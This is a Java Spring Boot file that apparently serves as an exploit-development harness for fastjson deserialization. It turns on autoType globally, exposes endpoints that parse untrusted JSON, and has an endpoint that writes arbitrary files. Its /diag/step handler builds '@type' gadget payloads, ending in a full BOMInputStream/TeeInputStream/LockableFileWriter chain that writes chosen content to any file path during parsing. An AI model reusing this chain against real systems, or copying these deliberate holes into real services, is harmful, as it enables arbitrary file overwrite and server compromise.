package com.test;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;
import com.auth0.jwt.JWT;
import com.auth0.jwt.interfaces.DecodedJWT;
import org.apache.commons.io.input.CharSequenceReader;
import org.apache.commons.io.input.ReaderInputStream;
import org.apache.commons.io.input.TeeInputStream;
import org.apache.commons.io.output.LockableFileWriter;
import org.apache.commons.io.output.WriterOutputStream;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.Map;

@SpringBootApplication
@RestController
public class App {

    static final Logger log = LoggerFactory.getLogger(App.class);

    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        log.info("[BOOT] autoType={}", ParserConfig.getGlobalInstance().isAutoTypeSupport());
        SpringApplication.run(App.class, args);
    }

    @PostMapping("/notify/v2")
    public Map<String, Object> notifyV2(@RequestBody Map<String, String> body) {
        Map<String, Object> r = new LinkedHashMap<>();
        try {
            DecodedJWT jwt = JWT.decode(body.get("signedPayload"));
            String header = new String(Base64.getDecoder().decode(jwt.getHeader()), StandardCharsets.UTF_8);
            log.info("[V2] preview={}", header.substring(0, Math.min(80, header.length())));
            JSONObject.parseObject(header);
            r.put("code", 500); r.put("msg", "ok");
        } catch (NullPointerException e) {
            r.put("code", 500); r.put("msg", "NPE-ok");
        } catch (Exception e) {
            log.error("[V2-ERR] {}:{}", e.getClass().getName(), e.getMessage());
            r.put("code", 500); r.put("type", e.getClass().getSimpleName()); r.put("msg", e.getMessage());
        }
        return r;
    }

    @PostMapping(value = "/raw", consumes = "*/*")
    public Map<String, Object> raw(HttpServletRequest request) {
        Map<String, Object> r = new LinkedHashMap<>();
        try {
            String json = new String(request.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
            log.info("[RAW] len={}", json.length());
            JSONObject.parseObject(json);
            r.put("ok", true);
        } catch (Exception e) {
            log.error("[RAW-ERR] {}:{}", e.getClass().getName(), e.getMessage());
            r.put("ok", false); r.put("type", e.getClass().getSimpleName()); r.put("msg", e.getMessage());
        }
        return r;
    }

    @PostMapping("/diag/chain")
    public Map<String, Object> diagChain(@RequestBody Map<String, String> body) {
        Map<String, Object> r = new LinkedHashMap<>();
        String file = body.getOrDefault("file", "/tmp/chain_test");
        String content = body.getOrDefault("content", "CHAIN-TEST\n");
        try {
            String padded = content + " ".repeat(Math.max(0, 8193 - content.length()));
            Charset cs = Charset.forName("iso-8859-1");
            ReaderInputStream ris = new ReaderInputStream(new CharSequenceReader(padded), cs, 1);
            LockableFileWriter lfw = new LockableFileWriter(new File(file), "iso-8859-1", false, "/tmp");
            WriterOutputStream wos = new WriterOutputStream(lfw, cs, 1, true);
            TeeInputStream tee = new TeeInputStream(ris, wos, true);
            byte[] buf = new byte[8192]; while (tee.read(buf) != -1) {}
            tee.close();
            r.put("ok", true); r.put("file", file);
        } catch (Exception e) {
            log.error("[CHAIN-ERR] {}:{}", e.getClass().getName(), e.getMessage());
            r.put("ok", false); r.put("msg", e.getMessage());
        }
        return r;
    }

    /**
     * step=K  反射检查 PushbackInputStream 注入后 buf/pos/in 字段值，并验证 read()
     * step=L  StringBufferInputStream 反射检查 count（验证是否通过构造函数设置）
     * step=M  完整链：PushbackInputStream 作为数据源 + BOMInputStream.$ref:$.bOM 作为触发器
     *         （替代 XmlStreamReader，BOMInputStream.getBOM() 读取固定字节数并流经 TeeInputStream）
     */
    @PostMapping("/diag/step")
    public Map<String, Object> diagStep(@RequestBody Map<String, String> body) {
        String step = body.getOrDefault("step", "K");
        String file = body.getOrDefault("file", "/tmp/step_" + step);
        String content = body.getOrDefault("content", "STEP-" + step + "-OK\n");
        Map<String, Object> r = new LinkedHashMap<>();

        byte[] contentBytes = content.getBytes(StandardCharsets.ISO_8859_1);
        // 对于 PushbackInputStream，buf[0] 会被跳过（pos=1 after ctor），前面多加一个填充字节
        byte[] pbBytes = new byte[contentBytes.length + 1];
        pbBytes[0] = 0x20; // 空格，跳过不影响内容
        System.arraycopy(contentBytes, 0, pbBytes, 1, contentBytes.length);
        String b64PB = Base64.getEncoder().encodeToString(pbBytes);
        int pbLen = pbBytes.length;

        String b64Content = Base64.getEncoder().encodeToString(contentBytes);
        String escapedFile = file.replace("\\", "\\\\").replace("\"", "\\\"");

        try {
            switch (step) {

                case "K": {
                    // 测试 PushbackInputStream 字段注入
                    // PushbackInputStream(InputStream in) ctor: pos=1, buf=[0x00]（1字节）
                    // fastjson 注入 buf=pbBytes 后: buf.length=N, pos 可能还是 1 或 被注入为 0
                    // 内层 in 用空 ByteArrayInputStream（只要非 null，ensureOpen() 就通过）
                    String json = "{\"@type\":\"java.lang.AutoCloseable\","
                            + "\"@type\":\"java.io.PushbackInputStream\","
                            + "\"in\":{\"@type\":\"java.lang.AutoCloseable\","
                                + "\"@type\":\"java.io.ByteArrayInputStream\","
                                + "\"buf\":\"AA==\"},"  // 1 zero byte, count=0 ok (just needs non-null)
                            + "\"buf\":\"" + b64PB + "\"}";

                    log.info("[STEP-K] json={}", json.substring(0, Math.min(100, json.length())));
                    Object obj = JSONObject.parseObject(json);
                    log.info("[STEP-K] type={}", obj == null ? "null" : obj.getClass().getName());

                    if (obj instanceof PushbackInputStream) {
                        PushbackInputStream pis = (PushbackInputStream) obj;
                        // 反射检查 buf 和 pos
                        Field bufF = PushbackInputStream.class.getDeclaredField("buf");
                        bufF.setAccessible(true);
                        byte[] buf = (byte[]) bufF.get(pis);
                        Field posF = PushbackInputStream.class.getDeclaredField("pos");
                        posF.setAccessible(true);
                        int pos = (int) posF.get(pis);
                        Field inF = FilterInputStream.class.getDeclaredField("in");
                        inF.setAccessible(true);
                        Object in = inF.get(pis);

                        log.info("[STEP-K] buf.length={} pos={} in={}",
                                buf == null ? "null" : buf.length, pos,
                                in == null ? "null" : in.getClass().getName());

                        r.put("bufLen", buf == null ? -1 : buf.length);
                        r.put("pos", pos);
                        r.put("inType", in == null ? "null" : in.getClass().getSimpleName());

                        // 尝试读取
                        try {
                            int first = pis.read();
                            log.info("[STEP-K] first read()={} (char={})", first,
                                    first > 0 ? String.valueOf((char) first) : "?");
                            r.put("firstRead", first);
                            // 读取剩余
                            byte[] readBuf = new byte[256];
                            int n = pis.read(readBuf);
                            String preview = n > 0 ? new String(readBuf, 0, Math.min(n, 30)) : "(none)";
                            log.info("[STEP-K] read({}) preview={}", n, preview);
                            r.put("readMore", n);
                            r.put("preview", preview);
                        } catch (Exception re) {
                            log.error("[STEP-K] read failed: {}", re.getMessage());
                            r.put("readError", re.getMessage());
                        }
                    }
                    r.put("ok", true);
                    break;
                }

                case "L": {
                    // 验证 StringBufferInputStream 的 count 字段
                    String json = "{\"@type\":\"java.lang.AutoCloseable\","
                            + "\"@type\":\"java.io.StringBufferInputStream\","
                            + "\"s\":\"" + content.replace("\"", "\\\"") + "\"}";
                    log.info("[STEP-L] json={}", json);
                    Object obj = JSONObject.parseObject(json);
                    log.info("[STEP-L] type={}", obj == null ? "null" : obj.getClass().getName());

                    if (obj != null && obj.getClass().getName().contains("StringBufferInputStream")) {
                        Field countF = obj.getClass().getDeclaredField("count");
                        countF.setAccessible(true);
                        int count = (int) countF.get(obj);
                        Field bufferF = obj.getClass().getDeclaredField("buffer");
                        bufferF.setAccessible(true);
                        String buffer = (String) bufferF.get(obj);
                        log.info("[STEP-L] count={} buffer={}", count,
                                buffer == null ? "null" : buffer.substring(0, Math.min(20, buffer.length())));
                        r.put("count", count);
                        r.put("bufferPreview", buffer == null ? "null" : buffer.substring(0, Math.min(20, buffer.length())));

                        InputStream sbis = (InputStream) obj;
                        int first = sbis.read();
                        log.info("[STEP-L] first read()={}", first);
                        r.put("firstRead", first);
                    }
                    r.put("ok", true);
                    break;
                }

                case "M": {
                    // 完整链: PushbackInputStream → TeeInputStream → WriterOutputStream → LockableFileWriter
                    // 触发: BOMInputStream.$ref:$.bOM 调用 getBOM()，读取 pbLen 字节流经 TeeInputStream
                    //
                    // boms 配置一个 pbLen 字节的 BOM（内容全为0）→ getBOM() 读 pbLen 字节
                    // 这 pbLen 字节来自 PushbackInputStream.buf（我们注入的内容）
                    // TeeInputStream 将每个字节同时写入 WriterOutputStream → LockableFileWriter

                    StringBuilder bomsArr = new StringBuilder("[0");
                    for (int i = 1; i < pbLen; i++) bomsArr.append(",0");
                    bomsArr.append("]");

                    String json = "{\"@type\":\"java.io.InputStream\","
                            + "\"@type\":\"org.apache.commons.io.input.BOMInputStream\","
                            + "\"delegate\":{"
                                + "\"@type\":\"org.apache.commons.io.input.TeeInputStream\","
                                + "\"input\":{"  // TeeInputStream 的 input
                                    + "\"@type\":\"java.io.PushbackInputStream\","
                                    + "\"in\":{\"@type\":\"java.io.ByteArrayInputStream\",\"buf\":\"AA==\"},"
                                    + "\"buf\":\"" + b64PB + "\""
                                + "},"
                                + "\"branch\":{"  // TeeInputStream 的 branch = 写文件
                                    + "\"@type\":\"org.apache.commons.io.output.WriterOutputStream\","
                                    + "\"writer\":{"
                                        + "\"@type\":\"java.io.Writer\","
                                        + "\"@type\":\"org.apache.commons.io.output.LockableFileWriter\","
                                        + "\"file\":\"" + escapedFile + "\","
                                        + "\"encoding\":\"iso-8859-1\","
                                        + "\"lockDir\":\"/tmp\","
                                        + "\"append\":false"
                                    + "},"
                                    + "\"charsetName\":\"iso-8859-1\","
                                    + "\"bufferSize\":1,"
                                    + "\"writeImmediately\":true"
                                + "},"
                                + "\"closeBranch\":true"
                            + "},"
                            + "\"include\":true,"
                            + "\"boms\":[{\"@type\":\"org.apache.commons.io.ByteOrderMark\","
                                + "\"charsetName\":\"iso-8859-1\","
                                + "\"bytes\":" + bomsArr
                            + "}],"
                            + "\"x\":{\"$ref\":\"$.bOM\"}"
                            + "}";

                    log.info("[STEP-M] json len={}", json.length());
                    Object result = JSONObject.parseObject(json);
                    log.info("[STEP-M] parseObject OK, type={}",
                            result == null ? "null" : result.getClass().getName());

                    File f = new File(file);
                    log.info("[STEP-M] file exists={} size={}", f.exists(), f.exists() ? f.length() : -1);
                    r.put("fileExists", f.exists());
                    r.put("fileSize", f.exists() ? f.length() : -1);
                    r.put("ok", true);
                    break;
                }

                default:
                    r.put("ok", false); r.put("msg", "step must be K/L/M"); return r;
            }

        } catch (Exception e) {
            log.error("[STEP-{}-ERR] {}:{}", step, e.getClass().getName(), e.getMessage());
            StringWriter sw = new StringWriter(); e.printStackTrace(new PrintWriter(sw));
            log.error("[STEP-{}-STACK]\n{}", step, sw);
            r.put("ok", false);
            r.put("type", e.getClass().getSimpleName());
            r.put("msg", e.getMessage());
            File f = new File(file);
            r.put("fileExists", f.exists());
            r.put("fileSize", f.exists() ? f.length() : -1);
        }
        return r;
    }
}
